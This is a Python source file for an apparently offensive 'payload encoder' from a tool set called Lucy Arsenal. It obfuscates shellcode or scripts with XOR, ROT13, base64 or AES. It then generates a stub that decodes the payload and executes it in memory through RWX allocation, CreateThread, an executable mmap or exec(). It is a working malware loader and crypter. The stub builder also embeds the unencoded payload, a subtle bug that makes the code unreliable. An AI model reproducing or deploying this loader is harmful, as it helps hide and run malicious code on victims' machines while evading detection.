#!/usr/bin/env python3
"""
payload_encoder.py — Payload-Encoder (outil #49 du mapping Fifty).
Encode un payload (shellcode, script, binaire) selon un mode :
  xor, rot13, base64, aes (AES-256-GCM via cryptography ou pycryptodome).
Génère soit un fichier encodé brut, soit un stub Python autonome
(-o foo.py) qui décode et exécute en mémoire.

Usage:
  python payload_encoder.py -m xor -k KEY -i shellcode.bin -o stub.py
  python payload_encoder.py -m aes -k SECRET -i agent.py -o stub.py --kind py
  python payload_encoder.py -m base64 -i blob.bin -o blob.b64
  python payload_encoder.py -m xor -k K -i in.bin -o out.bin --verify
"""
import argparse
import base64
import hashlib
import os
import secrets
import sys

# --- Backend AES : cryptography puis pycryptodome -------------------------
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    _AES_BACKEND = "cryptography"
except ImportError:
    try:
        from Crypto.Cipher import AES
        _AES_BACKEND = "pycryptodome"
    except ImportError:
        _AES_BACKEND = None

_PAD = "="
ROT13_TABLE = bytes.maketrans(
    b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    b"NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
)


# --- Primitives -----------------------------------------------------------
def _xor(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("XOR exige une cle (-k)")
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))


def _rot13(data: bytes, key: bytes = None) -> bytes:
    return data.translate(ROT13_TABLE)


def _b64e(data: bytes, key: bytes = None) -> bytes:
    return base64.b64encode(data)


def _b64d(data: bytes, key: bytes = None) -> bytes:
    return base64.b64decode(data)


def _derive_key(passphrase: str, salt: bytes) -> bytes:
    """PBKDF2-HMAC-SHA256 -> 32 octets (NIST SP 800-132)."""
    return hashlib.pbkdf2_hmac(
        "sha256", passphrase.encode("utf-8"), salt, 200_000, dklen=32
    )


def _aes_encrypt(data: bytes, passphrase: str) -> bytes:
    if _AES_BACKEND is None:
        raise RuntimeError("Mode AES indisponible : installer cryptography ou pycryptodome")
    salt = secrets.token_bytes(16)
    key = _derive_key(passphrase, salt)
    if _AES_BACKEND == "cryptography":
        nonce = secrets.token_bytes(12)
        ct = AESGCM(key).encrypt(nonce, data, None)
        return b"LCAES1" + salt + nonce + ct
    cipher = AES.new(key, AES.MODE_GCM, nonce=secrets.token_bytes(12))
    ct, tag = cipher.encrypt_and_digest(data)
    return b"LCAES1" + salt + cipher.nonce + tag + ct


def _aes_decrypt(blob: bytes, passphrase: str) -> bytes:
    if _AES_BACKEND is None:
        raise RuntimeError("Mode AES indisponible : installer cryptography ou pycryptodome")
    if not blob.startswith(b"LCAES1") or len(blob) < 16 + 12 + 16 + 1:
        raise ValueError("Blob AES invalide")
    salt, nonce = blob[6:22], blob[22:34]
    key = _derive_key(passphrase, salt)
    if _AES_BACKEND == "cryptography":
        return AESGCM(key).decrypt(nonce, blob[34:], None)
    tag, ct = blob[34:50], blob[50:]
    return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)


ENCODERS = {
    "xor": (_xor, _xor),
    "rot13": (_rot13, _rot13),
    "base64": (_b64e, _b64d),
    "aes": (_aes_encrypt, _aes_decrypt),
}


def encode(mode: str, data: bytes, key: str) -> bytes:
    if mode not in ENCODERS:
        raise ValueError("Mode inconnu: %s (xor|rot13|base64|aes)" % mode)
    fn, _ = ENCODERS[mode]
    return fn(data, key.encode("utf-8") if mode == "xor" else key)


def decode(mode: str, data: bytes, key: str) -> bytes:
    if mode not in ENCODERS:
        raise ValueError("Mode inconnu: %s" % mode)
    _, fn = ENCODERS[mode]
    return fn(data, key.encode("utf-8") if mode == "xor" else key)


# --- Stub autonome ---------------------------------------------------------
_STUB_TEMPLATE = r'''#!/usr/bin/env python3
# Stub genere par payload_encoder.py (Lucy Arsenal) — decode + execute en memoire.
# Ne rien ecrire sur disque (sauf action explicite).
import base64
import ctypes
import os
import sys

_MODE = %(mode)r
_KEY = %(key_b64)r
_KEY_ENV = %(key_env)r
_KIND = %(kind)r
_PAY_B64 = %(payload_b64)r
_PAY_B64 = _PAY_B64.replace("\n", "")


def _xor(d, k):
    if not k:
        raise ValueError("cle XOR vide")
    return bytes(b ^ k[i %% len(k)] for i, b in enumerate(d))


def _rot13(d):
    t = bytes.maketrans(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                        b"NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")
    return d.translate(t)


def _b64d(d):
    return base64.b64decode(d)


def _derive(passphrase, salt):
    import hashlib
    return hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), salt, 200000, 32)


def _aesd(blob, passphrase):
    if blob[:6] != b"LCAES1" or len(blob) < 34:
        raise ValueError("blob AES invalide")
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        salt, nonce = blob[6:22], blob[22:34]
        return AESGCM(_derive(passphrase, salt)).decrypt(nonce, blob[34:], None)
    except ImportError:
        from Crypto.Cipher import AES
        salt, nonce = blob[6:22], blob[22:34]
        key = _derive(passphrase, salt)
        tag, ct = blob[34:50], blob[50:]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)


def _decode(blob):
    key = os.environ.get(_KEY_ENV) or _KEY
    key = key.encode("utf-8") if _MODE == "xor" else key
    if _MODE == "xor":
        return _xor(blob, key)
    if _MODE == "rot13":
        return _rot13(blob)
    if _MODE == "base64":
        return _b64d(blob)
    if _MODE == "aes":
        return _aesd(blob, key)
    raise ValueError("mode inconnu: " + _MODE)


def _exec_bin(blob):
    if os.name == "nt":
        buf = ctypes.windll.kernel32.VirtualAlloc(
            None, len(blob), 0x3000, 0x40)
        ctypes.memmove(buf, blob, len(blob))
        ctypes.windll.kernel32.VirtualProtect(buf, len(blob), 0x20, ctypes.byref(ctypes.c_ulong()))
        ctypes.windll.kernel32.CreateThread(None, 0, buf, None, 0, None)
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_void_p(-1), 0xFFFFFFFF)
    else:
        import mmap
        m = mmap.mmap(-1, len(blob), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        m.write(blob)
        fn = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))
        fn()
        m.close()


def main():
    try:
        payload = _decode(base64.b64decode(_PAY_B64))
        if _KIND == "py":
            ns = {"__name__": "__lucy_stub__"}
            exec(compile(payload, "<lucy:stub>", "exec"), ns)
        else:
            _exec_bin(payload)
    except Exception as exc:  # pragma: no cover
        sys.stderr.write("stub error: %%s\n" %% exc)
        sys.exit(1)


if __name__ == "__main__":
    main()
'''


def _build_stub(mode: str, key: str, payload: bytes, kind: str, key_env: str) -> str:
    key_b64 = ""
    if mode == "xor":
        key_b64 = base64.b64encode(key.encode("utf-8")).decode("ascii")
    elif mode == "aes":
        key_b64 = base64.b64encode(key.encode("utf-8")).decode("ascii")
    return _STUB_TEMPLATE % {
        "mode": mode,
        "key_b64": key_b64,
        "key_env": key_env or "",
        "kind": kind,
        "payload_b64": base64.b64encode(payload).decode("ascii"),
    }


# --- CLI -------------------------------------------------------------------
def _parse_args(argv):
    p = argparse.ArgumentParser(description="Payload-Encoder Lucy (xor/rot13/base64/aes + stub)")
    p.add_argument("-m", "--mode", required=True, choices=sorted(ENCODERS),
                   help="mode d'encodage")
    p.add_argument("-k", "--key", default="", help="cle/passphrase (xor/aes)")
    p.add_argument("-i", "--input", required=True, help="fichier payload")
    p.add_argument("-o", "--output", required=True,
                   help="sortie (stub Python si extension .py, sinon blob brut)")
    p.add_argument("--kind", default="shellcode", choices=["shellcode", "bin", "py"],
                   help="type d'execution du stub (defaut: shellcode)")
    p.add_argument("--key-env", default="",
                   help="variable d'env lue par le stub au lieu de la cle embarque")
    p.add_argument("--verify", action="store_true", help="verifie le round-trip decode")
    return p.parse_args(argv)


def main(argv=None):
    args = _parse_args(argv if argv is not None else sys.argv[1:])
    with open(args.input, "rb") as fh:
        payload = fh.read()
    encoded = encode(args.mode, payload, args.key)

    if args.output.endswith(".py"):
        out = _build_stub(args.mode, args.key, payload, args.kind, args.key_env)
        mode_out = "w"
    else:
        out = encoded
        mode_out = "wb"

    with open(args.output, mode_out) as fh:
        fh.write(out)

    info = {
        "mode": args.mode,
        "input": args.input,
        "input_size": len(payload),
        "output": args.output,
        "output_size": len(encoded),
        "kind": args.kind,
    }
    if args.verify:
        if args.output.endswith(".py"):
            # verifie la partie encodee (sans executer le stub)
            back = decode(args.mode, encoded, args.key)
            info["verify"] = "PASS" if back == payload else "FAIL"
        else:
            back = decode(args.mode, encoded, args.key)
            info["verify"] = "PASS" if back == payload else "FAIL"
        if info["verify"] == "FAIL":
            sys.exit(2)
    print("payload_encoder:", info)
    return info


if __name__ == "__main__":
    main()
